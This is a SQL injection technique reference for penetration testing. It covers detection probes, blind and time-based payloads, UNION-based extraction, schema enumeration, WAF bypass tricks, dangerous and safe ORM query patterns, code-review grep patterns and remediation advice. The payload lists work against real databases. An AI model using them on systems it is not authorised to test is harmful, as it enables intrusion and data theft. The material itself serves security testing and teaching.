# SQL injection — technique reference

> Reference, not checklist. Use this when injection is the working hypothesis;
> pivot when the data says you're wrong.

## 1. Mental model

SQL injection happens when **untrusted input is concatenated into a query
string** and the parser cannot distinguish data from code. Every defense
collapses to one rule: *use parameterised queries* (prepared statements). All
other defenses (escaping, sanitising, WAFs) are layered mitigations, not fixes.

The interesting axes:

| Axis | Variants |
|------|----------|
| **Channel** | in-band (visible response), inferential (boolean / time-based blind), out-of-band (DNS, HTTP) |
| **Context** | string, numeric, identifier (table / column), order-by, like, json operator, stored proc arg |
| **DBMS** | MySQL, PostgreSQL, MSSQL, Oracle, SQLite, MariaDB, CockroachDB; each has unique syntax (comments, concat, time functions, error formats) |
| **Layer** | direct SQL, ORM (Hibernate / SQLAlchemy / ActiveRecord) — ORMs with raw fragments still vulnerable |
| **Auth state** | pre-auth (login, registration, password reset) vs post-auth |

## 2. Detection

### 2.1 First-look perturbations

For every parameter (URL, body, header, cookie, JSON value, GraphQL arg):

```
'        # break a string literal
"        # break a quoted literal
\        # may escape closing quote in poorly-built escapers
)        # break out of a function call
;        # statement terminator (rarely useful in modern stacks)
--       # comment to end of line (MySQL needs trailing space)
/*...*/  # inline comment
0x...    # hex literal
```

If the response **changes shape** (status, length, error string, time) → SQLi
is now a hypothesis worth testing. If everything looks the same, try numeric
context (`1` vs `1+0` vs `2-1`) — boolean equivalence breaks WAF naive filters.

### 2.2 Boolean-blind detection

```
id=1 AND 1=1     -> normal response
id=1 AND 1=2     -> different response (smaller, different content)
```

Stable difference across multiple repetitions = inferential channel found.

### 2.3 Time-based detection

Only when no boolean channel exists. Be careful — slow responses lie.

```sql
-- MySQL
SLEEP(5)
-- PostgreSQL
pg_sleep(5)
-- MSSQL
WAITFOR DELAY '0:0:5'
-- Oracle
DBMS_LOCK.SLEEP(5)  -- requires perms; use DBMS_PIPE.RECEIVE_MESSAGE() instead
-- SQLite (no native sleep — use heavy expression)
RANDOMBLOB(100000000)
```

Always test with two different delays (3s and 8s) to confirm linear scaling
versus jitter or rate-limit lag.

### 2.4 Out-of-band

If the DB can do DNS / HTTP egress: use it. PostgreSQL `dblink`, MSSQL
`xp_dirtree`, MySQL `LOAD_FILE` (UNC paths on Windows), Oracle
`UTL_HTTP.REQUEST`. Set up an OOB collector (Burp Collaborator, interactsh)
and inject a callback to your subdomain. **Never** use a third-party callback
service in scope-sensitive engagements without scope approval.

### 2.5 Error-based fingerprinting

Provoke a parser error and read the DBMS from the message:

```
'        ->  "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version"  -> MySQL
'        ->  "unterminated quoted string at or near"                                                                  -> PostgreSQL
'        ->  "Unclosed quotation mark after the character string"                                                     -> MSSQL
'        ->  "ORA-01756: quoted string not properly terminated"                                                       -> Oracle
'        ->  "near \"'\": syntax error"                                                                                -> SQLite
```

## 3. Confirmation & extraction

### 3.1 UNION-based

Steps:

1. Find column count: `' ORDER BY 1 -- ` … `' ORDER BY N -- ` until error.
2. Find which columns are reflected: `' UNION SELECT 'a','b','c' -- ` then look
   for `a`, `b`, `c` in response.
3. Match types if needed: pad with `NULL` or cast: `CAST(NULL AS varchar)`.
4. Extract: `' UNION SELECT version(),user(),database() -- ` (MySQL/PostgreSQL),
   `@@version,SYSTEM_USER,DB_NAME()` (MSSQL).

### 3.2 Information schema

```sql
-- MySQL / PostgreSQL / MSSQL
SELECT table_name FROM information_schema.tables WHERE table_schema = DATABASE();
SELECT column_name FROM information_schema.columns WHERE table_name = 'users';

-- Oracle
SELECT table_name FROM all_tables;
SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS';

-- SQLite
SELECT name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE name='users';
```

### 3.3 Stacked queries

Most MySQL drivers reject `;`-stacked queries. PostgreSQL, MSSQL via certain
drivers, and SQLite often accept them. Useful for `INSERT`, `UPDATE`, file
write (MSSQL `xp_cmdshell`, PostgreSQL `COPY ... FROM PROGRAM`).

## 4. Context-specific tricks

### 4.1 ORDER BY

Cannot use parameter binding for column names. Common pattern:

```sql
SELECT * FROM users ORDER BY <user_input>
```

Inject expression: `(CASE WHEN (1=1) THEN id ELSE name END)`. This is a
boolean-blind oracle that doesn't rely on quote breaking.

### 4.2 LIMIT / OFFSET

Some MySQL versions accept procedural injection:

```sql
LIMIT 10 PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,@@version)))
```

(Older MySQL only — modern versions removed `PROCEDURE ANALYSE`.)

### 4.3 LIKE clause

Pattern-context injection: `%' OR '1'='1`. Watch for `\` and underscore
handling.

### 4.4 JSON operators (PostgreSQL)

```
->>'name'  -- text
->>$1     -- bind  -- if app substitutes $1 by string concat → injectable
```

### 4.5 Stored procedure parameters

Same rules. The proc concatenating its own args is the bug class — calling
the proc safely doesn't help.

### 4.6 ORM raw fragments

```python
# SQLAlchemy — DANGEROUS pattern
session.execute("SELECT * FROM users WHERE name = '" + name + "'")
# SAFE
session.execute(text("SELECT * FROM users WHERE name = :n"), {"n": name})
```

```ruby
# ActiveRecord — DANGEROUS
User.where("name = '#{params[:name]}'")
# SAFE
User.where(name: params[:name])
```

```java
// Hibernate — DANGEROUS
session.createQuery("FROM User WHERE name = '" + name + "'");
// SAFE
session.createQuery("FROM User WHERE name = :n").setParameter("n", name);
```

Look for string concatenation, `String.format`, `f"..."`, `${...}`, or
template engines feeding queries.

## 5. Bypass library

When a WAF or naive filter sits in front:

| Filter | Bypass |
|--------|--------|
| Strips `'` | use `0x` hex (`0x61646d696e` = `'admin'`), or `CHAR(...)` |
| Strips `OR` | `||`, `\|\|`, `OOORR` (double-pass collapsing) |
| Strips spaces | `/**/`, tab, newline (`%0a`), parens: `id=(1)AND(1=1)` |
| Strips `UNION` | `UnIoN`, `UNI%00ON`, comment-split `UN/**/ION` |
| Strips `SELECT` | `SeLeCt`, splice, conditional WAF: try with comment-stripping turn-on |
| Forces lowercase | `UNION` → no help (still keyword); use `union` directly |
| Length cap | use shortest equivalent: `IF(1,2,3)` over `CASE WHEN` |
| Charset filter | swap to wide chars (UTF-16, double encoding `%2527`) |

## 6. Second-order

Input stored at one endpoint, executed at another. Detection requires
correlating writes (registration, profile update, comment) with later reads
(admin panels, search, reports). Inject a payload that's harmless on storage
but explodes on retrieval (e.g. SQL comment markers that survive escaping but
combine on read).

## 7. NoSQL injection (call out)

Dedicated reference exists; the family is distinct (operator injection in
JSON, JS injection in Mongo `$where`, blind boolean via `$regex`). Do not
treat as a SQLi sub-case.

## 8. Source-code review heuristics

Grep for:

```
grep -rEn "execute\(|raw\(|exec_raw|prepare\(|createQuery\(|createNativeQuery\("
grep -rEn "f\".*SELECT.*\{" --include='*.py'   # Python f-string with SELECT
grep -rEn "\\\$\{.*\}.*SELECT" --include='*.java'
grep -rEn "['\"].*\+.*\+.*['\"]" | grep -iE "select|insert|update|delete|where"
grep -rEn "@Query\(" --include='*.java'
grep -rEn "ActiveRecord::Base.connection.execute"
```

Flag: any place where untrusted input reaches a query string by concatenation,
template substitution, or format string.

## 9. Defenses (for remediation guidance)

1. **Parameterised queries** — non-negotiable.
2. **Allowlist** for identifiers (table / column names) when they must be
   dynamic — never blocklist.
3. **Least-privilege DB user** — engagement-time goal: enumerate the
   privileges the web app's DB user holds. SUPER, FILE, EXECUTE are red flags.
4. **Network egress restriction** for DB hosts kills OOB exfiltration.
5. **WAF** is layered defense, not a fix; assume bypassable.
6. **Generic error pages** prevent leaking DBMS fingerprint.
7. **Query monitoring / anomaly detection** (slow log, query digest) catches
   exfil patterns post-compromise.

## 10. CWE / standards mapping

- CWE-89 — SQL injection
- CWE-564 — Hibernate / ORM injection
- OWASP WSTG WSTG-INPV-05
- OWASP ASVS V5.3
- OWASP Top 10 2021 A03 Injection
- MITRE ATT&CK T1190 (Exploit Public-Facing Application)

## 11. Tools

- `sqlmap` — automated; tune with `--level`, `--risk`, `--technique`, `--dbms`,
  `--prefix`, `--suffix`, `--tamper`
- `ghauri` — sqlmap alternative, sometimes succeeds where sqlmap fails
- Burp Suite — manual / Intruder for fine-grained payloads
- Custom curl + diff loop for boolean-blind in CI-friendly scripts

> Note: **automated tools amplify, they do not substitute reasoning.** Run
> sqlmap after you have a manual hypothesis confirmed; otherwise you generate
> noise and miss context-sensitive bugs.
